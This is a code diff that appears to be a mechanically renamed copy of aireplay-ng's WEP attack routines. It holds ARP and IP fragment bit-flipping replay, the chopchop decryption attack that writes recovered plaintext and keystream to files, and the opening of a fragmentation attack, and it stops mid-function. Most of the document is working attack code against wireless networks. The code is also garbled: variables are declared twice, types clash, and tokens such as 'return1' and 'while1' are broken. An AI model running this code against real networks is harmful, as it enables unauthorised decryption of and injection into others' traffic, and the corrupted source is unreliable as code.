+    buf[1] = 0x04;
+    buf[2] = 0x00;
+    buf[3] = 0x01;
+    memcpy(buf+4, mymac, 6);
+    buf[10] = 0xA9;
+    buf[11] = 0xFE;
+
+    return 0;
+}
+
+int fn_90( void )
+{
+    int var_117, var_122;
+    struct struct_112 tv;
+    struct struct_112 tv2;
+    float f, ticks[3];
+    unsigned char bssid[6];
+    unsigned char smac[6];
+    unsigned char dmac[6];
+    unsigned char keystream[128];
+    unsigned char frag1[128], frag2[128], frag3[128];
+    unsigned char clear[4096], final[4096], flip[4096];
+    int isarp;
+    int z, var_122;
+
+    opt.f_fromds = 0;
+
+read_packets:
+
+    if( capture_ask_packet( &var_117, 0 ) != 0 )
+        return1;
+
+    z = ( ( h80211[1] & 3 ) != 3 ) ? 24 : 30;
+    if ( ( h80211[0] & 0x80 ) == 0x80 )
+        z+=2;
+
+    if(var_117 < z)
+    {
+        goto read_packets;
+    }
+
+    if(var_117 > 3800)
+    {
+        goto read_packets;
+    }
+
+    switch( h80211[1] & 3 )
+    {
+        case 0:
+            memcpy( bssid, h80211 + 16, 6 );
+            memcpy( dmac, h80211 + 4, 6 );
+            memcpy( smac, h80211 + 10, 6 );
+            break;
+        case 1:
+            memcpy( bssid, h80211 + 4, 6 );
+            memcpy( dmac, h80211 + 16, 6 );
+            memcpy( smac, h80211 + 10, 6 );
+            break;
+        case 2:
+            memcpy( bssid, h80211 + 10, 6 );
+            memcpy( dmac, h80211 + 4, 6 );
+            memcpy( smac, h80211 + 16, 6 );
+            break;
+        default:
+            memcpy( bssid, h80211 + 10, 6 );
+            memcpy( dmac, h80211 + 16, 6 );
+            memcpy( smac, h80211 + 24, 6 );
+            break;
+    }
+
+    memset(clear, 0, 4096);
+    memset(final, 0, 4096);
+    memset(flip, 0, 4096);
+    memset(frag1, 0, 128);
+    memset(frag2, 0, 128);
+    memset(frag3, 0, 128);
+    memset(keystream, 0, 128);
+
+
+
+
+    if( (var_117-z == 44 || var_117-z == 62) && (memcmp(dmac, BROADCAST, 6) == 0 || (dmac[0]%2) == 0) )
+    {
+
+        printf("Found ARP packet\n");
+        isarp = 1;
+
+        set_clear_arp(clear, smac, dmac);
+        set_final_arp(final, opt.r_smac);
+
+        for(var_122=0; var_122<14; var_122++)
+            keystream[var_122] = (h80211+z+4)[var_122] ^ clear[var_122];
+
+
+
+        if( (h80211[1] & 3) == 0x00 )
+        {
+            h80211[1] = 0x40;
+            memcpy(h80211+4, smac, 6);
+            memcpy(h80211+10, opt.r_smac, 6);
+            memcpy(h80211+16, bssid, 6);
+        }
+        else
+        {
+            if(opt.f_tods == 1)
+            {
+                h80211[1] = 0x41;
+                memcpy(h80211+4 , bssid, 6);
+                memcpy(h80211+10, opt.r_smac, 6);
+                memcpy(h80211+16, smac, 6);
+            }
+            else
+            {
+                h80211[1] = 0x42;
+                memcpy(h80211+4, smac, 6);
+                memcpy(h80211+10, bssid, 6);
+                memcpy(h80211+16, opt.r_smac, 6);
+            }
+        }
+        h80211[22] = 0xD0;
+        h80211[23] = 0x50;
+
+
+        memcpy(frag1, h80211, z+4);
+        frag1[1] |= 0x04;
+        memcpy(frag1+z+4, S_LLC_SNAP_ARP, 8);
+        frag1[z+4+8] = 0x00;
+        frag1[z+4+9] = 0x01;
+        add_crc32(frag1+z+4, 10);
+        for(var_122=0; var_122<14; var_122++)
+            (frag1+z+4)[var_122] ^= keystream[var_122];
+
+
+        for(var_122=0; var_122<var_117; var_122++)
+            flip[var_122] = clear[var_122] ^ final[var_122];
+
+        add_crc32_plain(flip, var_117-z-4-4);
+
+        for(var_122=0; var_122<var_117-z-4; var_122++)
+            (h80211+z+4)[var_122] ^= flip[var_122];
+        h80211[22] = 0xD1;
+
+
+    }
+    else
+    {
+
+        printf("Found IP packet\n");
+        isarp = 0;
+
+        set_clear_ip(clear, var_117-z-4-8-4);
+        set_final_ip(final, opt.r_smac);
+
+        for(var_122=0; var_122<8; var_122++)
+            keystream[var_122] = (h80211+z+4)[var_122] ^ clear[var_122];
+
+
+
+        if( (h80211[1] & 3) == 0x00 )
+        {
+            h80211[1] = 0x40;
+            memcpy(h80211+4, smac, 6);
+            memcpy(h80211+10, opt.r_smac, 6);
+            memcpy(h80211+16, bssid, 6);
+        }
+        else
+        {
+            if(opt.f_tods == 1)
+            {
+                h80211[1] = 0x41;
+                memcpy(h80211+4 , bssid, 6);
+                memcpy(h80211+10, opt.r_smac, 6);
+                memcpy(h80211+16, smac, 6);
+            }
+            else
+            {
+                h80211[1] = 0x42;
+                memcpy(h80211+4, smac, 6);
+                memcpy(h80211+10, bssid, 6);
+                memcpy(h80211+16, opt.r_smac, 6);
+            }
+        }
+        h80211[22] = 0xD0;
+        h80211[23] = 0x50;
+
+
+        memcpy(frag1, h80211, z+4);
+        memcpy(frag2, h80211, z+4);
+        memcpy(frag3, h80211, z+4);
+        frag1[1] |= 0x04;
+        frag2[1] |= 0x04;
+        frag3[1] |= 0x04;
+
+        memcpy(frag1+z+4, S_LLC_SNAP_ARP, 4);
+        add_crc32(frag1+z+4, 4);
+        for(var_122=0; var_122<8; var_122++)
+            (frag1+z+4)[var_122] ^= keystream[var_122];
+
+        memcpy(frag2+z+4, S_LLC_SNAP_ARP+4, 4);
+        add_crc32(frag2+z+4, 4);
+        for(var_122=0; var_122<8; var_122++)
+            (frag2+z+4)[var_122] ^= keystream[var_122];
+        frag2[22] = 0xD1;
+
+        frag3[z+4+0] = 0x00;
+        frag3[z+4+1] = 0x01;
+        frag3[z+4+2] = 0x08;
+        frag3[z+4+3] = 0x00;
+        add_crc32(frag3+z+4, 4);
+        for(var_122=0; var_122<8; var_122++)
+            (frag3+z+4)[var_122] ^= keystream[var_122];
+        frag3[22] = 0xD2;
+
+
+        for(var_122=0; var_122<var_117; var_122++)
+            flip[var_122] = clear[var_122] ^ final[var_122];
+
+        add_crc32_plain(flip, var_117-z-4-4);
+
+        for(var_122=0; var_122<var_117-z-4; var_122++)
+            (h80211+z+4)[var_122] ^= flip[var_122];
+        h80211[22] = 0xD3;
+
+
+    }
+
+
+
+
+
+    printf( "You should also start airodump-ng to capture replies.\n\n" );
+
+    signal( SIGINT, sighandler );
+    ctrl_c = 0;
+
+    memset( ticks, 0, sizeof( ticks ) );
+
+    nb_pkt_sent = 0;
+
+    while1
+    {
+        if( ctrl_c )
+            goto read_packets;
+
+
+
+        if( dev.fd_rtc >= 0 )
+        {
+            if( read( dev.fd_rtc, &var_122, sizeof( var_122 ) ) < 0 )
+            {
+                perror( "read(/dev/rtc) failed" );
+                return1;
+            }
+
+            ticks[0]++;
+            ticks[1]++;
+            ticks[2]++;
+        }
+        else
+        {
+
+
+            gettimeofday( &tv, NULL );
+            usleep( 122 );
+            gettimeofday( &tv2, NULL );
+
+            f = 1000000 * (float) ( tv2.tv_sec - tv.tv_sec )
+                        + (float) ( tv2.tv_usec - tv.tv_usec );
+
+            ticks[0] += f / 122;
+            ticks[1] += f / 122;
+            ticks[2] += f / 122;
+        }
+
+
+
+        if( ticks[1] > 819 )
+        {
+            ticks[1] = 0;
+            printf( "\rSent %ld packets...(%d pps)\33[K\r", nb_pkt_sent, (int)((double)nb_pkt_sent/((double)ticks[0]/(double)8192)));
+            fflush( stdout );
+        }
+
+        if( ( ticks[2] * opt.r_nbpps ) / 8192 < 1 )
+            continue;
+
+
+
+        ticks[2] = 0;
+
+        if( nb_pkt_sent == 0 )
+            ticks[0] = 0;
+
+        if(isarp)
+        {
+            if( send_packet( frag1, z+4+10+4 ) < 0 )
+                return1;
+            nb_pkt_sent--;
+        }
+        else
+        {
+            if( send_packet( frag1, z+4+4+4 ) < 0 )
+                return1;
+            if( send_packet( frag2, z+4+4+4 ) < 0 )
+                return1;
+            if( send_packet( frag3, z+4+4+4 ) < 0 )
+                return1;
+            nb_pkt_sent-=3;
+        }
+        if( send_packet( h80211, var_117 ) < 0 )
+            return1;
+    }
+
+    return0;
+}
+
+int fn_91( void )
+{
+    float f, ticks[4];
+    int var_122, var_117, var_122, z, var_117, srcz;
+    int data_start, data_end, srcdiff, diff;
+    int guess, is_deauth_mode;
+    int nb_bad_pkt;
+    int var_95=0;
+
+    unsigned char var_95 = 0xAA;
+    unsigned char var_95 = 0xAA;
+
+    FILE *f_cap_out;
+    long nb_pkt_read;
+    unsigned long crc_mask;
+    unsigned char *chopped;
+
+    unsigned char packet[4096];
+
+    time_t tt;
+    struct struct_99 *lt;
+    struct struct_112 tv;
+    struct struct_112 tv2;
+    struct struct_122 pfh_out;
+    struct struct_95 pkh;
+
+
+    if(getnet(NULL, 1, 0) != 0)
+        return 1;
+
+    srand( time( NULL ) );
+
+    if( capture_ask_packet( &var_117, 0 ) != 0 )
+        return1;
+
+    z = ( ( h80211[1] & 3 ) != 3 ) ? 24 : 30;
+    if ( ( h80211[0] & 0x80 ) == 0x80 )
+        z+=2;
+    srcz = z;
+
+    if( (unsigned)var_117 > sizeof(srcbuf) || (unsigned)var_117 > sizeof(h80211) )
+        return1;
+
+    if( opt.r_smac_set == 1 )
+    {
+
+        memset(packet, 0, sizeof(packet));
+
+        memcpy( packet, "\x48\x01\x3A\x01\xBB\xBB\xBB\xBB\xBB\xBB\xCC\xCC\xCC\xCC\xCC\xCC" "\xBB\xBB\xBB\xBB\xBB\xBB\xE0\x1B", 24 );
+        memcpy( packet + 4, "\xFF\xFF\xFF\xFF\xFF\xFF", 6 );
+        memcpy( packet + 10, opt.r_smac, 6 );
+        memcpy( packet + 16, opt.f_bssid, 6 );
+
+        packet[0] = 0x08;
+        packet[1] = 0x41;
+
+        memcpy( packet+24, h80211+z, var_117-z);
+
+        if( send_packet( packet, var_117-z+24 ) != 0 )
+            return1;
+
+    }
+
+
+    if ( memcmp( h80211 + 4, SPANTREE, 6 ) == 0 ||
+        memcmp( h80211 + 16, SPANTREE, 6 ) == 0 )
+    {
+        var_95 = 0x42; var_95 = 0x42;
+    }
+
+    printf( "\n" );
+
+
+
+
+
+    memcpy( srcbuf, h80211, var_117 );
+
+
+
+    var_122 = var_117 - z + 24;
+
+    if( ( chopped = (unsigned char *) malloc( var_122 ) ) == NULL )
+    {
+        perror( "malloc failed" );
+        return1;
+    }
+
+    memset( chopped, 0, var_122 );
+
+    data_start = 28;
+    data_end = var_122;
+    srcdiff = z-24;
+
+    chopped[0] = 0x08;
+    chopped[1] = 0x41;
+
+
+
+    memcpy( chopped + 2, h80211 + 2, 2 );
+
+
+
+    switch( h80211[1] & 3 )
+    {
+        case 0: memcpy( chopped + 4, h80211 + 16, 6 ); break;
+        case 1: memcpy( chopped + 4, h80211 + 4, 6 ); break;
+        case 2: memcpy( chopped + 4, h80211 + 10, 6 ); break;
+        default: memcpy( chopped + 4, h80211 + 10, 6 ); break;
+    }
+
+
+
+    memcpy( chopped + 24, h80211 + z, 4 );
+
+
+
+    crc_mask = 0;
+
+    for( var_122 = data_start; var_122 < data_end - 4; var_122++ )
+    {
+        switch( var_122 - data_start )
+        {
+            case 0: chopped[var_122] = var_95 ^ 0xE0; break;
+            case 1: chopped[var_122] = var_95 ^ 0xE0; break;
+            case 2: chopped[var_122] = 0x03 ^ 0x03; break;
+            default: chopped[var_122] = 0x55 ^ ( var_122 & 0xFF ); break;
+        }
+
+        crc_mask = crc_tbl[crc_mask & 0xFF]
+                 ^ ( crc_mask >> 8 )
+                 ^ ( chopped[var_122] << 24 );
+    }
+
+    for( var_122 = 0; var_122 < 4; var_122++ )
+        crc_mask = crc_tbl[crc_mask & 0xFF]
+                 ^ ( crc_mask >> 8 );
+
+    chopped[data_end - 4] = crc_mask; crc_mask >>= 8;
+    chopped[data_end - 3] = crc_mask; crc_mask >>= 8;
+    chopped[data_end - 2] = crc_mask; crc_mask >>= 8;
+    chopped[data_end - 1] = crc_mask; crc_mask >>= 8;
+
+    for( var_122 = data_start; var_122 < data_end; var_122++ )
+        chopped[var_122] ^= srcbuf[var_122+srcdiff];
+
+    data_start += 6;
+
+
+
+    if( opt.r_smac_set == 0 )
+    {
+        is_deauth_mode = 1;
+
+        opt.r_smac[0] = 0x00;
+        opt.r_smac[1] = rand() & 0x3E;
+        opt.r_smac[2] = rand() & 0xFF;
+        opt.r_smac[3] = rand() & 0xFF;
+        opt.r_smac[4] = rand() & 0xFF;
+
+        memcpy( opt.r_dmac, "\xFF\xFF\xFF\xFF\xFF\xFF", 6 );
+    }
+    else
+    {
+        is_deauth_mode = 0;
+
+        opt.r_dmac[0] = 0xFF;
+        opt.r_dmac[1] = rand() & 0xFE;
+        opt.r_dmac[2] = rand() & 0xFF;
+        opt.r_dmac[3] = rand() & 0xFF;
+        opt.r_dmac[4] = rand() & 0xFF;
+    }
+
+
+
+    memset( ticks, 0, sizeof( ticks ) );
+
+    nb_pkt_read = 0;
+    nb_pkt_sent = 0;
+    nb_bad_pkt = 0;
+    guess = 256;
+
+    tt = time( NULL );
+
+    alarm( 30 );
+
+    signal( SIGALRM, sighandler );
+
+    if(opt.port_in <= 0)
+    {
+        if( fcntl( dev.fd_in, F_SETFL, O_NONBLOCK ) < 0 )
+        {
+            perror( "fcntl(O_NONBLOCK) failed" );
+            return1;
+        }
+    }
+
+    while( data_end > data_start )
+    {
+        if( alarmed )
+        {
+            printf( "\n\n"
+"The chopchop attack appears to have failed. Possible reasons:\n"
+"\n"
+"    * You're trying to inject with an unsupported chipset (Centrino?).\n"
+"    * The driver source wasn't properly patched for injection support.\n"
+"    * You are too far from the AP. Get closer or reduce the send rate.\n"
+"    * Target is 802.11g only but you are using a Prism2 or RTL8180.\n"
+"    * The wireless interface isn't setup on the correct channel.\n" );
+            if( is_deauth_mode )
+                printf(
+"    * The AP isn't vulnerable when operating in non-authenticated mode.\n"
+"      Run aireplay-ng in authenticated mode instead (-h option).\n\n" );
+            else
+                printf(
+"    * The client MAC you have specified is not currently authenticated.\n"
+"      Try running another aireplay-ng to fake authentication (attack \"-1\").\n"
+"    * The AP isn't vulnerable when operating in authenticated mode.\n"
+"      Try aireplay-ng in non-authenticated mode instead (no -h option).\n\n" );
+            return1;
+        }
+
+
+
+        if( dev.fd_rtc >= 0 )
+        {
+            if( read( dev.fd_rtc, &var_122, sizeof( var_122 ) ) < 0 )
+            {
+                perror( "\nread(/dev/rtc) failed" );
+                return1;
+            }
+
+            ticks[0]++;
+            ticks[1]++;
+            ticks[2]++;
+            ticks[3]++;
+        }
+        else
+        {
+
+
+            gettimeofday( &tv, NULL );
+            usleep( 976 );
+            gettimeofday( &tv2, NULL );
+
+            f = 1000000 * (float) ( tv2.tv_sec - tv.tv_sec )
+                        + (float) ( tv2.tv_usec - tv.tv_usec );
+
+            ticks[0] += f / 976;
+            ticks[1] += f / 976;
+            ticks[2] += f / 976;
+            ticks[3] += f / 976;
+        }
+
+
+
+        if( ticks[1] > 819 )
+        {
+            ticks[1] = 0;
+            printf( "\rSent %3ld packets, current guess: %02X...\33[K",
+                    nb_pkt_sent, guess );
+            fflush( stdout );
+        }
+
+        if( data_end < 41 && ticks[3] > 8 * ( ticks[0] - ticks[3] ) /
+                                (int) ( var_117 - ( data_end - 1 ) ) )
+        {
+            header_rec:
+
+            printf( "\n\nThe AP appears to drop packets shorter "
+                    "than %d bytes.\n",data_end );
+
+            data_end = 40;
+
+            z = ( ( h80211[1] & 3 ) != 3 ) ? 24 : 30;
+            if ( ( h80211[0] & 0x80 ) == 0x80 )
+                z+=2;
+
+            diff = z-24;
+
+            if( ( chopped[data_end + 0] ^ srcbuf[data_end + srcdiff + 0] ) == 0x06 &&
+                ( chopped[data_end + 1] ^ srcbuf[data_end + srcdiff + 1] ) == 0x04 &&
+                ( chopped[data_end + 2] ^ srcbuf[data_end + srcdiff + 2] ) == 0x00 )
+            {
+                printf( "Enabling standard workaround: "
+                        "ARP header re-creation.\n" );
+
+                chopped[34] = srcbuf[srcz + 10] ^ 0x08;
+                chopped[35] = srcbuf[srcz + 11] ^ 0x06;
+                chopped[36] = srcbuf[srcz + 12] ^ 0x00;
+                chopped[37] = srcbuf[srcz + 13] ^ 0x01;
+                chopped[38] = srcbuf[srcz + 14] ^ 0x08;
+                chopped[39] = srcbuf[srcz + 15] ^ 0x00;
+            }
+            else
+            {
+                printf( "Enabling standard workaround: "
+                        " IP header re-creation.\n" );
+
+                var_122 = var_117 - ( z + 16 );
+
+                chopped[28] = srcbuf[srcz + 4] ^ 0xAA;
+                chopped[29] = srcbuf[srcz + 5] ^ 0xAA;
+                chopped[30] = srcbuf[srcz + 6] ^ 0x03;
+                chopped[31] = srcbuf[srcz + 7] ^ 0x00;
+                chopped[32] = srcbuf[srcz + 8] ^ 0x00;
+                chopped[33] = srcbuf[srcz + 9] ^ 0x00;
+                chopped[34] = srcbuf[srcz + 10] ^ 0x08;
+                chopped[35] = srcbuf[srcz + 11] ^ 0x00;
+                chopped[38] = srcbuf[srcz + 14] ^ ( var_122 >> 8 );
+                chopped[39] = srcbuf[srcz + 15] ^ ( var_122 & 0xFF );
+
+                memcpy( h80211, srcbuf, var_117 );
+
+                for( var_122 = z + 4; var_122 < (int) var_117; var_122++ )
+                    h80211[var_122 - 4] = h80211[var_122] ^ chopped[var_122-diff];
+
+
+
+                for( var_122 = 0; var_122 < 16; var_122++ )
+                {
+                    h80211[z + 8] = 0x40 + var_122;
+                    chopped[36] = srcbuf[srcz + 12] ^ ( 0x40 + var_122 );
+
+                    for( var_117 = 0; var_117 < 256; var_117++ )
+                    {
+                        h80211[z + 9] = var_117;
+                        chopped[37] = srcbuf[srcz + 13] ^ var_117;
+
+                        if( check_crc_buf( h80211 + z, var_117 - z - 8 ) )
+                            goto have_crc_match;
+                    }
+                }
+
+                printf( "This doesn't look like an IP packet, "
+                        "try another one.\n" );
+            }
+
+        have_crc_match:
+            break;
+        }
+
+        if( ( ticks[2] * opt.r_nbpps ) / 8192 >= 1 )
+        {
+
+
+            ticks[2] = 0;
+
+            memcpy( h80211, chopped, data_end - 1 );
+
+
+
+
+
+            if( is_deauth_mode )
+            {
+                opt.r_smac[1] |= ( guess < 256 );
+                opt.r_smac[5] = guess & 0xFF;
+            }
+            else
+            {
+                opt.r_dmac[1] |= ( guess < 256 );
+                opt.r_dmac[5] = guess & 0xFF;
+            }
+
+            memcpy( h80211 + 10, opt.r_smac, 6 );
+            memcpy( h80211 + 16, opt.r_dmac, 6 );
+
+            if( guess < 256 )
+            {
+                h80211[data_end - 2] ^= crc_chop_tbl[guess][3];
+                h80211[data_end - 3] ^= crc_chop_tbl[guess][2];
+                h80211[data_end - 4] ^= crc_chop_tbl[guess][1];
+                h80211[data_end - 5] ^= crc_chop_tbl[guess][0];
+            }
+
+            errno = 0;
+
+            if( send_packet( h80211, data_end -1 ) != 0 )
+                return1;
+
+            if( errno != EAGAIN )
+            {
+                guess++;
+
+                if( guess > 256 )
+                    guess = 0;
+            }
+        }
+
+
+
+        var_122 = read_packet( h80211, sizeof( h80211 ), NULL );
+
+        if( var_122 < 0 ) return1;
+        if( var_122 == 0 ) continue;
+
+        nb_pkt_read++;
+
+
+
+        if( h80211[0] == 0xA0 || h80211[0] == 0xC0 )
+        {
+            if( memcmp( h80211 + 4, opt.r_smac, 6 ) == 0 &&
+                ! is_deauth_mode )
+            {
+                nb_bad_pkt++;
+
+                if( nb_bad_pkt > 256 )
+                {
+                    printf("\rgot several deauthentication packets - pausing 3 seconds for reconnection\n");
+                    sleep(3);
+                    nb_bad_pkt = 0;
+                }
+
+                continue;
+            }
+
+            if( h80211[4] != opt.r_smac[0] ) continue;
+            if( h80211[6] != opt.r_smac[2] ) continue;
+            if( h80211[7] != opt.r_smac[3] ) continue;
+            if( h80211[8] != opt.r_smac[4] ) continue;
+
+            if( ( h80211[5] & 0xFE ) !=
+                ( opt.r_smac[1] & 0xFE ) ) continue;
+
+            if( ! ( h80211[5] & 1 ) )
+            {
+             if( data_end < 41 ) goto header_rec;
+
+                printf( "\n\nFailure: the access point does not properly "
+                        "discard frames with an\ninvalid ICV - try running "
+                        "aireplay-ng in authenticated mode (-h) instead.\n\n" );
+                return1;
+            }
+        }
+        else
+        {
+            if( is_deauth_mode )
+                continue;
+
+
+
+            if( ( h80211[0] & 0x0C ) != 8 ) continue;
+            if( ( h80211[0] & 0x70 ) != 0 ) continue;
+            if( ( h80211[1] & 0x03 ) != 2 ) continue;
+            if( ( h80211[1] & 0x40 ) == 0 ) continue;
+
+
+
+            z = ( ( h80211[1] & 3 ) != 3 ) ? 24 : 30;
+            if ( ( h80211[0] & 0x80 ) == 0x80 )
+                z+=2;
+
+            if( ( h80211[z + 3] & 0x20 ) != 0 ) continue;
+
+
+
+            if( h80211[4] != opt.r_dmac[0] ) continue;
+            if( h80211[6] != opt.r_dmac[2] ) continue;
+            if( h80211[7] != opt.r_dmac[3] ) continue;
+            if( h80211[8] != opt.r_dmac[4] ) continue;
+
+            if( ( h80211[5] & 0xFE ) !=
+                ( opt.r_dmac[1] & 0xFE ) ) continue;
+
+            if( ! ( h80211[5] & 1 ) )
+            {
+             if( data_end < 41 ) goto header_rec;
+
+                printf( "\n\nFailure: the access point does not properly "
+                        "discard frames with an\ninvalid ICV - try running "
+                        "aireplay-ng in non-authenticated mode instead.\n\n" );
+                return1;
+            }
+        }
+
+
+
+        guess = h80211[9];
+
+        chopped[data_end - 1] ^= guess;
+        chopped[data_end - 2] ^= crc_chop_tbl[guess][3];
+        chopped[data_end - 3] ^= crc_chop_tbl[guess][2];
+        chopped[data_end - 4] ^= crc_chop_tbl[guess][1];
+        chopped[data_end - 5] ^= crc_chop_tbl[guess][0];
+
+        var_122 = var_117 - data_start;
+
+        printf( "\rOffset %4d (%2d%% done) | xor = %02X | pt = %02X | "
+                "%4ld frames written in %5.0fms\n", data_end - 1,
+                100 * ( var_117 - data_end ) / var_122,
+                chopped[data_end - 1],
+                chopped[data_end - 1] ^ srcbuf[data_end + srcdiff - 1],
+                nb_pkt_sent, ticks[3] );
+
+        if( is_deauth_mode )
+        {
+            opt.r_smac[1] = rand() & 0x3E;
+            opt.r_smac[2] = rand() & 0xFF;
+            opt.r_smac[3] = rand() & 0xFF;
+            opt.r_smac[4] = rand() & 0xFF;
+        }
+        else
+        {
+            opt.r_dmac[1] = rand() & 0xFE;
+            opt.r_dmac[2] = rand() & 0xFF;
+            opt.r_dmac[3] = rand() & 0xFF;
+            opt.r_dmac[4] = rand() & 0xFF;
+        }
+
+        ticks[3] = 0;
+        nb_pkt_sent = 0;
+        nb_bad_pkt = 0;
+        guess = 256;
+
+        data_end--;
+
+        alarm( 0 );
+    }
+
+
+
+    memcpy( h80211, srcbuf, var_117 );
+
+    z = ( ( h80211[1] & 3 ) != 3 ) ? 24 : 30;
+    if ( ( h80211[0] & 0x80 ) == 0x80 )
+        z+=2;
+    diff = z-24;
+
+    chopped[28] = srcbuf[srcz + 4] ^ var_95;
+    chopped[29] = srcbuf[srcz + 5] ^ var_95;
+    chopped[30] = srcbuf[srcz + 6] ^ 0x03;
+    chopped[31] = srcbuf[srcz + 7] ^ 0x00;
+    chopped[32] = srcbuf[srcz + 8] ^ 0x00;
+    chopped[33] = srcbuf[srcz + 9] ^ 0x00;
+
+    for( var_122 = z + 4; var_122 < (int) var_117; var_122++ )
+        h80211[var_122 - 4] = h80211[var_122] ^ chopped[var_122-diff];
+
+    if( ! check_crc_buf( h80211 + z, var_117 - z - 8 ) ) {
+        if (!var_95) {
+            printf( "\nWarning: ICV checksum verification FAILED! Trying workaround.\n" );
+            var_95=1;
+            goto header_rec;
+        } else {
+            printf( "\nWorkaround couldn't fix ICV checksum.\nPacket is most likely invalid/useless\nTry another one.\n" );
+        }
+    }
+
+    var_117 -= 8;
+
+    h80211[1] &= 0xBF;
+
+
+
+    gettimeofday( &tv, NULL );
+
+    pfh_out.magic = TCPDUMP_MAGIC;
+    pfh_out.version_major = PCAP_VERSION_MAJOR;
+    pfh_out.version_minor = PCAP_VERSION_MINOR;
+    pfh_out.thiszone = 0;
+    pfh_out.sigfigs = 0;
+    pfh_out.snaplen = 65535;
+    pfh_out.linktype = LINKTYPE_IEEE802_11;
+
+    pkh.tv_sec = tv.tv_sec;
+    pkh.tv_usec = tv.tv_usec;
+    pkh.caplen = var_117;
+    pkh.len = var_117;
+
+    lt = localtime( (const time_t *) &tv.tv_sec );
+
+    memset( strbuf, 0, sizeof( strbuf ) );
+    snprintf( strbuf, sizeof( strbuf ) - 1,
+              "replay_dec-%02d%02d-%02d%02d%02d.cap",
+              lt->tm_mon + 1, lt->tm_mday,
+              lt->tm_hour, lt->tm_min, lt->tm_sec );
+
+    printf( "\nSaving plaintext in %s\n", strbuf );
+
+    if( ( f_cap_out = fopen( strbuf, "wb+" ) ) == NULL )
+    {
+        perror( "fopen failed" );
+        return1;
+    }
+
+    var_122 = sizeof( struct struct_122 );
+
+    if( fwrite( &pfh_out, var_122, 1, f_cap_out ) != 1 )
+    {
+        perror( "fwrite failed\n" );
+        return1;
+    }
+
+    var_122 = sizeof( pkh );
+
+    if( fwrite( &pkh, var_122, 1, f_cap_out ) != 1 )
+    {
+        perror( "fwrite failed" );
+        return1;
+    }
+
+    var_122 = pkh.caplen;
+
+    if( fwrite( h80211, var_122, 1, f_cap_out ) != 1 )
+    {
+        perror( "fwrite failed" );
+        return1;
+    }
+
+    fclose( f_cap_out );
+
+
+
+    memset( strbuf, 0, sizeof( strbuf ) );
+    snprintf( strbuf, sizeof( strbuf ) - 1,
+              "replay_dec-%02d%02d-%02d%02d%02d.xor",
+              lt->tm_mon + 1, lt->tm_mday,
+              lt->tm_hour, lt->tm_min, lt->tm_sec );
+
+    printf( "Saving keystream in %s\n", strbuf );
+
+    if( ( f_cap_out = fopen( strbuf, "wb+" ) ) == NULL )
+    {
+        perror( "fopen failed" );
+        return1;
+    }
+
+    var_122 = pkh.caplen + 8 - 24;
+
+    if( fwrite( chopped + 24, var_122, 1, f_cap_out ) != 1 )
+    {
+        perror( "fwrite failed" );
+        return1;
+    }
+
+    fclose( f_cap_out );
+
+    printf( "\nCompleted in %lds (%0.2f bytes/s)\n\n",
+            (long) time( NULL ) - tt,
+            (float) ( pkh.caplen - 6 - 24 ) /
+            (float) ( time( NULL ) - tt ) );
+
+    return0;
+}
+
+int fn_95(unsigned char *h80211, unsigned char *bssid, unsigned char *src_mac, unsigned char *dst_mac, unsigned char *src_ip, unsigned char *dst_ip, int var_96)
+{
+ unsigned char *arp_header = (unsigned char*)"\xaa\xaa\x03\x00\x00\x00\x08\x06\x00\x01\x08\x00\x06\x04\x00\x01";
+ unsigned char *header80211 = (unsigned char*)"\x08\x41\x95\x00";
+
+
+    memcpy(h80211, header80211, 4);
+    memcpy(h80211+4, bssid, 6);
+    memcpy(h80211+10, src_mac, 6);
+    memcpy(h80211+16, dst_mac, 6);
+    h80211[22] = '\x00';
+    h80211[23] = '\x00';
+
+
+    memcpy(h80211+24, arp_header, 16);
+    memcpy(h80211+40, src_mac, 6);
+    memcpy(h80211+46, src_ip, 4);
+    memset(h80211+50, '\x00', 6);
+    memcpy(h80211+56, dst_ip, 4);
+
+
+    memset(h80211+60, '\x00', var_96-60);
+
+    return 0;
+}
+
+void fn_96(char *filename, unsigned char *iv, unsigned char *prga, int var_98)
+{
+    FILE *xorfile;
+    size_t unused;
+    xorfile = fopen(filename, "wb");
+    unused = fwrite (iv, 1, 4, xorfile);
+    unused = fwrite (prga, 1, var_98, xorfile);
+    fclose (xorfile);
+}
+
+int fn_98()
+{
+    unsigned char packet[4096];
+    unsigned char packet2[4096];
+    unsigned char prga[4096];
+    unsigned char iv[4];
+
+
+
+    char strbuf[256];
+
+    struct struct_99 *lt;
+    struct struct_112 tv, tv2;
+
+    int done;
+    int var_117;
+    int caplen2;
+    int arplen;
+    int round;
+    int prga_len;
+    int isrelay;
+    int again;
+    int length;
+    int var_122;
+    int var_117;
+    int acksgot;
+    int var_100;
+    int z;
+
+    unsigned char *snap_header = (unsigned char*)"\xAA\xAA\x03\x00\x00\x00\x08\x00";
+
+    done = var_117 = caplen2 = arplen = round = 0;
+    prga_len = isrelay = var_117 = again = length = 0;
+
+    if( memcmp( opt.r_smac, NULL_MAC, 6 ) == 0 )
+    {
+        printf( "Please specify a source MAC (-h).\n" );
+        return1;
+    }
+
+    if(getnet(NULL, 1, 1) != 0)
+        return 1;
+
+    if( memcmp( opt.r_dmac, NULL_MAC, 6 ) == 0 )
+    {
+        memset( opt.r_dmac, '\xFF', 6);
+        opt.r_dmac[5] = 0xED;
+    }
+
+    if( memcmp( opt.r_sip, NULL_MAC, 4 ) == 0 )
+    {
+        memset( opt.r_sip, '\xFF', 4);
+    }
+
+    if( memcmp( opt.r_dip, NULL_MAC, 4 ) == 0 )
+    {
+        memset( opt.r_dip, '\xFF', 4);
+    }
+
+    PCT; printf ("Waiting for a data packet...\n");
+
+    while(!done)
+    {
+        round = 0;
+
+        if( capture_ask_packet( &var_117, 0 ) != 0 )
+            return -1;
+
+        z = ( ( h80211[1] & 3 ) != 3 ) ? 24 : 30;
+        if ( ( h80211[0] & 0x80 ) == 0x80 )
+            z+=2;
+
+        if((unsigned)var_117 > sizeof(packet) || (unsigned)var_117 > sizeof(packet2))
+            continue;
+
+        memcpy( packet2, h80211, var_117 );
+        caplen2 = var_117;
+        PCT; printf("Data packet found!\n");
+
+        if ( memcmp( packet2 + 4, SPANTREE, 6 ) == 0 ||
+             memcmp( packet2 + 16, SPANTREE, 6 ) == 0 )
+        {
+            packet2[z+4] = ((packet2[z+4] ^ 0x42) ^ 0xAA);
+            packet2[z+5] = ((packet2[z+5] ^ 0x42) ^ 0xAA);
+            packet2[z+10] = ((packet2[z+10] ^ 0x00) ^ 0x08);
+        }
+
+        prga_len = 7;
+
+        again = 2;
+
+        memcpy( packet, packet2, caplen2 );
+        var_117 = caplen2;
+        memcpy(prga, packet+z+4, prga_len);
